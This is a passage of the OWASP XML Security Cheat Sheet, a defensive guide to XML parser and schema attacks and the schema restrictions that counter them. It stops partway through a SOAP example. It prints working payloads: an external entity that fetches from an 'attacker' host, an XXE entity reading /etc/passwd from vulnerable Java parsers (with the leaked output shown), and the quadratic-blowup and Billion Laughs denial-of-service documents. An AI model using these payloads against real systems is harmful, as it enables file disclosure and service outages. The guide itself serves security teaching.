+> **Source:** [XML Security](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+While the specifications for XML and XML schemas provide you with the tools needed to protect XML applications, they also include multiple security flaws. They can be exploited to perform multiple types of attacks, including file retrieval, server side request forgery, port scanning, and brute forcing. This cheat sheet will make you aware of how attackers can exploit the different possibilities in XML used in libraries and software using two possible attack surfaces:
+
+- **Malformed XML Documents**: Exploiting vulnerabilities that occur when applications encounter XML documents that are not well-formed.
+- **Invalid XML Documents**: Exploiting vulnerabilities that occur when documents that do not have the expected structure.
+
+### Dealing with malformed XML documents
+
+#### Definition of a malformed XML document
+
+ If an XML document does not follow the W3C XML specification's definition of a well-formed document, it is considered "malformed." **If an XML document is malformed, the XML parser will detect a fatal error, it should stop execution, the document should not undergo any additional processing, and the application should display an error message.** A malformed document can include one or more of the following problems: a missing ending tag, the order of elements into a nonsensical structure, introducing forbidden characters, and so on.
+
+#### Handling malformed XML documents
+
+**To deal with malformed documents, developers should use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents.** In addition, they should only use well-formed documents, validate the contents of each element, and process only valid values within predefined boundaries.
+
+##### Malformed XML documents require extra time
+
+**A malformed document may affect the consumption of Central Processing Unit (CPU) resources.** In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).
+
+**To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document.** Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.
+
+#### Applications Processing Malformed Data
+
+**Certain XML parsers have the ability to recover malformed documents.** They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. **Since there are no predefined rules for the recovery process, the approach and results from these parsers may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.**
+
+The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:
+
+##### Malformed Document to Malformed Document
+
+According to the XML specification, the string `--` (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:
+
+```xml
+<element>
+ <!-- one
+  <!-- another comment
+ comment -->
+</element>
+```
+
+##### Well-Formed Document to Well-Formed Document Normalized
+
+Certain parsers may consider normalizing the contents of your `CDATA` sections. This means that they will update the special characters contained in the `CDATA` section to contain the safe versions of these characters even though is not required:
+
+```xml
+<element>
+ <![CDATA[<script>a=1;</script>]]>
+</element>
+```
+
+Normalization of a `CDATA` section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:
+
+```xml
+<element>
+ &lt;script&gt;a=1;&lt;/script&gt;
+</element>
+```
+
+#### Handling coercive parsing
+
+**One popular coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target.** Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:
+
+```xml
+<A1>
+ <A2>
+  <A3>
+   ...
+    <A30000>
+```
+
+### Violation of XML Specification Rules
+
+Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. **It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.**
+
+### Dealing with invalid XML documents
+
+**Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values.** Schemas specify restrictions that help identify whether documents are valid, and a valid document is well formed and complies with the restrictions of a schema. More than one schema can be used to validate a document, and these restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.
+
+The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.
+
+#### Document without Schema
+
+Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an `id` value related to an item and a certain `price`. The user may only introduce a certain `id` value using the web interface:
+
+```xml
+<buy>
+ <id>123</id>
+ <price>10</price>
+</buy>
+```
+
+**If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents**:
+
+```xml
+<buy>
+ <id>123</id><price>0</price><id></id>
+ <price>10</price>
+</buy>
+```
+
+Notice again how the value 123 is supplied as an `id`, but now the document includes additional opening and closing tags. The attacker closed the `id` element and sets a bogus `price` element to the value 0. The final step to keep the structure well-formed is to add one empty `id` element. After this, the application adds the closing tag for `id` and set the `price` to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.
+
+#### Unrestrictive Schema
+
+**Certain schemas do not offer enough restrictions for the type of data that each element can receive.** This is what normally happens when using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp); it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's `age` is validated against an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema:
+
+```xml
+<!DOCTYPE person [
+ <!ELEMENT person (name, age)>
+ <!ELEMENT name (#PCDATA)>
+ <!ELEMENT age (#PCDATA)>
+]>
+<person>
+ <name>John Doe</name>
+ <age>11111..(1.000.000digits)..11111</age>
+</person>
+```
+
+The previous document contains an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) with a root element named `person`. This element contains two elements in a specific order: `name` and then `age`. The element `name` is then defined to contain `PCDATA` as well as the element `age`.
+
+After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the `age` element contains one million digits. Since there are no restrictions on the maximum size for the `age` element, this one-million-digit string could be sent to the server for this element.
+
+Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents.
+
+Since it is not possible to indicate specific restrictions (a maximum length for the element `name` or a valid range for the element `age`), this type of schema increases the risk of affecting the integrity and availability of resources.
+
+#### Improper Data Validation
+
+**When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.**
+
+##### String Data Types
+
+Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:
+
+```xml
+<element name="CipherData" type="xenc:CipherDataType"/>
+ <complexType name="CipherDataType">
+  <choice>
+   <element name="CipherValue" type="base64Binary"/>
+   <element ref="xenc:CipherReference"/>
+  </choice>
+ </complexType>
+```
+
+The previous schema defines the element `CipherValue` as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid.
+
+The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the `CipherData` element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.
+
+##### Numeric Data Types
+
+**Defining the correct data type for numbers can be more complex since there are more options than there are for strings.**
+
+###### Negative and Positive Restrictions
+
+XML Schema numeric data types can include different ranges of numbers. They can include:
+
+- **negativeInteger**: Only negative numbers
+- **nonNegativeInteger**: Positive numbers and the zero value
+- **positiveInteger**: Only positive numbers
+- **nonPositiveInteger**: Negative numbers and the zero value
+
+The following sample document defines an `id` for a product, a `price`, and a `quantity` value that is under the control of an attacker:
+
+```xml
+<buy>
+ <id>1</id>
+ <price>10</price>
+ <quantity>1</quantity>
+</buy>
+```
+
+**To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:**
+
+```xml
+<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
+ <xs:element name="buy">
+  <xs:complexType>
+   <xs:sequence>
+    <xs:element name="id" type="xs:integer"/>
+    <xs:element name="price" type="xs:decimal"/>
+    <xs:element name="quantity" type="xs:integer"/>
+   </xs:sequence>
+  </xs:complexType>
+ </xs:element>
+</xs:schema>
+```
+
+Limiting that `quantity` to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing `price*quantity`. **However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.**
+
+###### Divide by Zero
+
+**Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error `FOAR0001` will occur. Other applications may throw other exceptions and the program may crash.** There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type `positiveInteger` for the element.
+
+```xml
+<xs:element name="denominator">
+ <xs:simpleType>
+  <xs:restriction base="xs:positiveInteger"/>
+ </xs:simpleType>
+</xs:element>
+```
+
+The element `denominator` is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.
+
+###### Special Values: Infinity and Not a Number (NaN)
+
+The data types `float` and `double` contain real numbers and some special values: `-Infinity` or `-INF`, `NaN`, and `+Infinity` or `INF`. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies.
+
+Not considering the whole spectrum of possible values for a data type could make underlying applications fail. **If the special values `Infinity` and `NaN` are not required and only real numbers are expected, the data type `decimal` is recommended:**
+
+```xml
+<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
+ <xs:element name="buy">
+  <xs:complexType>
+   <xs:sequence>
+    <xs:element name="id" type="xs:integer"/>
+    <xs:element name="price" type="xs:decimal"/>
+    <xs:element name="quantity" type="xs:positiveInteger"/>
+   </xs:sequence>
+  </xs:complexType>
+ </xs:element>
+</xs:schema>
+```
+
+**The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.**
+
+##### General Data Restrictions
+
+After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:
+
+###### Prefixed Values
+
+**Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called `enumeration` in an XML schema.** The following example restricts the contents of the element month to 12 possible values:
+
+```xml
+<xs:element name="month">
+ <xs:simpleType>
+  <xs:restriction base="xs:string">
+   <xs:enumeration value="January"/>
+   <xs:enumeration value="February"/>
+   <xs:enumeration value="March"/>
+   <xs:enumeration value="April"/>
+   <xs:enumeration value="May"/>
+   <xs:enumeration value="June"/>
+   <xs:enumeration value="July"/>
+   <xs:enumeration value="August"/>
+   <xs:enumeration value="September"/>
+   <xs:enumeration value="October"/>
+   <xs:enumeration value="November"/>
+   <xs:enumeration value="December"/>
+  </xs:restriction>
+ </xs:simpleType>
+</xs:element>
+```
+
+By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.
+
+###### Ranges
+
+Software applications, databases, and programming languages normally store information within specific ranges. **Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid.** The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:
+
+```xml
+<xs:element name="name">
+ <xs:simpleType>
+  <xs:restriction base="xs:string">
+   <xs:minLength value="3"/>
+   <xs:maxLength value="256"/>
+  </xs:restriction>
+ </xs:simpleType>
+</xs:element>
+```
+
+In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:
+
+```xml
+<xs:element name="name">
+ <xs:simpleType>
+  <xs:restriction base="xs:string">
+   <xs:length value="8"/>
+  </xs:restriction>
+ </xs:simpleType>
+</xs:element>
+```
+
+###### Patterns
+
+Certain elements or attributes may follow a specific syntax. You can add `pattern` restrictions when using XML schemas. **When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific `pattern`:**
+
+```xml
+<xs:element name="SSN">
+ <xs:simpleType>
+  <xs:restriction base="xs:token">
+   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
+  </xs:restriction>
+ </xs:simpleType>
+</xs:element>
+```
+
+Only numbers between `000-00-0000` and `999-99-9999` will be allowed as values for a SSN.
+
+###### Assertions
+
+**Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable `$value` can be used to reference the contents of the value being analyzed.**
+
+The *Divide by Zero* section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an `assertion` disallowing the number zero:
+
+```xml
+<xs:element name="denominator">
+ <xs:simpleType>
+  <xs:restriction base="xs:integer">
+   <xs:assertion test="$value != 0"/>
+  </xs:restriction>
+ </xs:simpleType>
+</xs:element>
+```
+
+The assertion guarantees that the `denominator` will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.
+
+###### Occurrences
+
+**The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed.** Two attributes specify minimum and maximum limits: `minOccurs` and `maxOccurs`.
+
+ The default value for both the `minOccurs` and the `maxOccurs` attributes is `1`, but certain elements may require other values. For instance, if a value is optional, it could contain a `minOccurs` of 0, and if there is no limit on the maximum amount, it could contain a `maxOccurs` of `unbounded`, as in the following example:
+
+```xml
+<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
+ <xs:element name="operation">
+  <xs:complexType>
+   <xs:sequence>
+    <xs:element name="buy" maxOccurs="unbounded">
+     <xs:complexType>
+      <xs:all>
+       <xs:element name="id" type="xs:integer"/>
+       <xs:element name="price" type="xs:decimal"/>
+       <xs:element name="quantity" type="xs:integer"/>
+      </xs:all>
+     </xs:complexType>
+    </xs:element>
+  </xs:complexType>
+ </xs:element>
+</xs:schema>
+```
+
+The previous schema includes a root element named `operation`, which can contain an unlimited (`unbounded`) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. **Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an `unbounded` value.**
+
+#### Jumbo Payloads
+
+**Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.**
+
+##### Traditional Jumbo Payloads
+
+**There are two primary methods to make a document larger than normal:**
+
+**- Depth attack: using a huge number of elements, element names, and/or element values.**
+
+**- Width attack: using a huge number of attributes, attribute names, and/or attribute values.**
+
+In most cases, the overall result will be a huge document. This is a short example of what this looks like:
+
+```xml
+<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
+                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
+ <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
+                 LARGENAME2="LARGEVALUE2"
+                 LARGENAME3="LARGEVALUE3" …>
+ ...
+```
+
+##### "Small" Jumbo Payloads
+
+**The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads.** The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+ <!ENTITY file SYSTEM "http://attacker/huge.xml" >
+]>
+<root>&file;</root>
+```
+
+#### Schema Poisoning
+
+**When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) (e.g., file retrieval, denial of service).** An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.
+
+##### Local Schema Poisoning
+
+**Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document.**
+
+###### Embedded Schema
+
+**The most trivial type of schema poisoning takes place when the schema is defined within the same XML document.** Consider the following, unknowingly vulnerable example provided by the W3C :
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE note [
+ <!ELEMENT note (to,from,heading,body)>
+ <!ELEMENT to (#PCDATA)>
+ <!ELEMENT from (#PCDATA)>
+ <!ELEMENT heading (#PCDATA)>
+ <!ELEMENT body (#PCDATA)>
+]>
+<note>
+ <to>Tove</to>
+ <from>Jani</from>
+ <heading>Reminder</heading>
+ <body>Don't forget me this weekend</body>
+</note>
+```
+
+All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. **This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.**
+
+###### Incorrect Permissions
+
+**You can often circumvent the risk of using remotely tampered versions by processing a local schema.**
+
+```xml
+<!DOCTYPE note SYSTEM "note.dtd">
+<note>
+ <to>Tove</to>
+ <from>Jani</from>
+ <heading>Reminder</heading>
+ <body>Don't forget me this weekend</body>
+</note>
+```
+
+**However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions.** The following line exemplifies a schema using permissions that allow any user to make modifications:
+
+```text
+-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
+```
+
+The permissions set on `name.dtd` allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.
+
+##### Remote Schema Poisoning
+
+**Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.**
+
+###### Man-in-the-Middle (MitM) Attack
+
+When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. **When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:**
+
+```xml
+<!DOCTYPE note SYSTEM "http://example.com/note.dtd">
+<note>
+ <to>Tove</to>
+ <from>Jani</from>
+ <heading>Reminder</heading>
+ <body>Don't forget me this weekend</body>
+</note>
+```
+
+The remote file `note.dtd` could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .
+
+###### DNS-Cache Poisoning
+
+Domain Name System (DNS) cache poisoning can change the IP address returned by a forward hostname lookup and redirect a schema connection. With HTTPS, the client must also [verify the certificate against the requested hostname](https://www.rfc-editor.org/rfc/rfc9110.html#section-4.3.4). DNS redirection alone does not let an attacker substitute schema content when that verification succeeds.
+
+The previous example referenced the host `example.com` using an unencrypted protocol.
+
+When switching to HTTPS, the location of the remote schema is `https://example.com/note.dtd`. Suppose a hostname lookup normally returns the following address:
+
+```bash
+$ host example.com
+example.com has address 1.1.1.1
+```
+
+If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker `2.2.2.2`:
+
+```bash
+$ host example.com
+example.com has address 2.2.2.2
+```
+
+The redirected HTTPS connection must fail if the attacker cannot present a certificate trusted for `example.com`. Content substitution requires an additional failure, such as disabled certificate verification or compromise of the certificate trust chain or legitimate server credentials. Keep certificate and hostname verification enabled and stop schema retrieval on verification failure. HTTPS authenticates the server; it does not make a schema safe if the legitimate host is compromised.
+
+###### Evil Employee Attack
+
+When third parties host and define schemas, the contents are not under the control of the schemas' users. **Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)).**
+
+#### XML Entity Expansion
+
+**If the parser uses a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.
+
+##### Sample Vulnerable Java Implementations
+
+**Using the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) capabilities of referencing local or remote files it is possible to affect file confidentiality.** In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.
+
+**Sample XML**:
+
+```xml
+<!DOCTYPE contacts SYSTEM "contacts.dtd">
+<contacts>
+ <contact>
+  <firstname>John</firstname>
+  <lastname>&xxe;</lastname>
+ </contact>
+</contacts>
+```
+
+**Sample DTD**:
+
+```xml
+<!ELEMENT contacts (contact*)>
+<!ELEMENT contact (firstname,lastname)>
+<!ELEMENT firstname (#PCDATA)>
+<!ELEMENT lastname ANY>
+<!ENTITY xxe SYSTEM "/etc/passwd">
+```
+
+###### XXE using DOM
+
+```java
+import java.io.IOException;
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+import javax.xml.parsers.ParserConfigurationException;
+import org.xml.sax.InputSource;
+import org.w3c.dom.Document;
+import org.w3c.dom.Element;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
+
+public class parseDocument {
+ public static void main(String[] args) {
+  try {
+   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+   DocumentBuilder builder = factory.newDocumentBuilder();
+   Document doc = builder.parse(new InputSource("contacts.xml"));
+   NodeList nodeList = doc.getElementsByTagName("contact");
+   for (int s = 0; s < nodeList.getLength(); s++) {
+     Node firstNode = nodeList.item(s);
+     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
+       Element firstElement = (Element) firstNode;
+       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
+       Element firstNameElement = (Element) firstNameElementList.item(0);
+       NodeList firstName = firstNameElement.getChildNodes();
+       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
+       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
+       Element lastNameElement = (Element) lastNameElementList.item(0);
+       NodeList lastName = lastNameElement.getChildNodes();
+       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
+     }
+    }
+  } catch (Exception e) {
+    e.printStackTrace();
+  }
+ }
+}
+```
+
+The previous code produces the following output:
+
+```bash
+$ javac parseDocument.java ; java parseDocument
+First Name: John
+Last Name: ### User Database
+...
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+```
+
+###### XXE using DOM4J
+
+```java
+import org.dom4j.Document;
+import org.dom4j.DocumentException;
+import org.dom4j.io.SAXReader;
+import org.dom4j.io.OutputFormat;
+import org.dom4j.io.XMLWriter;
+
+public class test1 {
+ public static void main(String[] args) {
+  Document document = null;
+  try {
+   SAXReader reader = new SAXReader();
+   document = reader.read("contacts.xml");
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+  OutputFormat format = OutputFormat.createPrettyPrint();
+  try {
+   XMLWriter writer = new XMLWriter( System.out, format );
+   writer.write( document );
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+ }
+}
+```
+
+The previous code produces the following output:
+
+```bash
+$ java test1
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE contacts SYSTEM "contacts.dtd">
+
+<contacts>
+ <contact>
+  <firstname>John</firstname>
+  <lastname>### User Database
+...
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+```
+
+###### XXE using SAX
+
+```java
+import java.io.IOException;
+import javax.xml.parsers.SAXParser;
+import javax.xml.parsers.SAXParserFactory;
+import org.xml.sax.SAXException;
+import org.xml.sax.helpers.DefaultHandler;
+
+public class parseDocument extends DefaultHandler {
+ public static void main(String[] args) {
+  new parseDocument();
+ }
+ public parseDocument() {
+  try {
+   SAXParserFactory factory = SAXParserFactory.newInstance();
+   SAXParser parser = factory.newSAXParser();
+   parser.parse("contacts.xml", this);
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+ }
+ @Override
+ public void characters(char[] ac, int i, int j) throws SAXException {
+  String tmpValue = new String(ac, i, j);
+  System.out.println(tmpValue);
+ }
+}
+```
+
+The previous code produces the following output:
+
+```bash
+$ java parseDocument
+John
+#### User Database
+...
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+```
+
+###### XXE using StAX
+
+```java
+import javax.xml.parsers.SAXParserFactory;
+import javax.xml.stream.XMLStreamReader;
+import javax.xml.stream.XMLInputFactory;
+import java.io.File;
+import java.io.FileReader;
+import java.io.FileInputStream;
+
+public class parseDocument {
+ public static void main(String[] args) {
+  try {
+   XMLInputFactory xmlif = XMLInputFactory.newInstance();
+   FileReader fr = new FileReader("contacts.xml");
+   File file = new File("contacts.xml");
+   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
+                                            new FileInputStream(file));
+   int eventType = xmlfer.getEventType();
+   while (xmlfer.hasNext()) {
+    eventType = xmlfer.next();
+    if(xmlfer.hasText()){
+     System.out.print(xmlfer.getText());
+    }
+   }
+   fr.close();
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+ }
+}
+
+```
+
+The previous code produces the following output:
+
+```bash
+$ java parseDocument
+<!DOCTYPE contacts SYSTEM "contacts.dtd">John### User Database
+...
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+```
+
+##### Recursive Entity Reference
+
+**When the definition of an element `A` is another element `B`, and that element `B` is defined as element `A`, that schema describes a circular reference between elements:**
+
+```xml
+<!DOCTYPE A [
+ <!ELEMENT A ANY>
+ <!ENTITY A "<A>&B;</A>">
+ <!ENTITY B "&A;">
+]>
+<A>&A;</A>
+```
+
+##### Quadratic Blowup
+
+**Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (*O(n^2)*).**
+
+The result of the following attack will be 100,000 x 100,000 characters in memory.
+
+```xml
+<!DOCTYPE root [
+ <!ELEMENT root ANY>
+ <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
+]>
+<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
+```
+
+##### Billion Laughs
+
+**When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes.** This is an example XML document with an embedded [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema including the attack:
+
+```xml
+<!DOCTYPE root [
+ <!ELEMENT root ANY>
+ <!ENTITY LOL "LOL">
+ <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
+ <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
+ <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
+ <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
+ <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
+ <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
+ <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
+ <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
+ <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
+]>
+<root>&LOL9;</root>
+```
+
+The entity `LOL9` will be resolved as the 10 entities defined in `LOL8`; then each of these entities will be resolved in `LOL7` and so on. Finally, the CPU and/or memory will be affected by parsing the `3 x 10^9` (3,000,000,000) entities defined in this schema, which could make the parser crash.
+
+**The Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) specification forbids [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)s completely. This means that a SOAP processor can reject any SOAP message that contains a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Despite this specification, certain SOAP implementations did parse [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schemas within SOAP messages.**
+
+The following example illustrates a case where the parser is not following the specification, enabling a reference to a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) in a SOAP message:
+
+```xml
+<?XML VERSION="1.0" ENCODING="UTF-8"?>
+<!DOCTYPE SOAP-ENV:ENVELOPE [
+ <!ELEMENT SOAP-ENV:ENVELOPE ANY>
+ <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
+ <!ENTITY LOL "LOL">
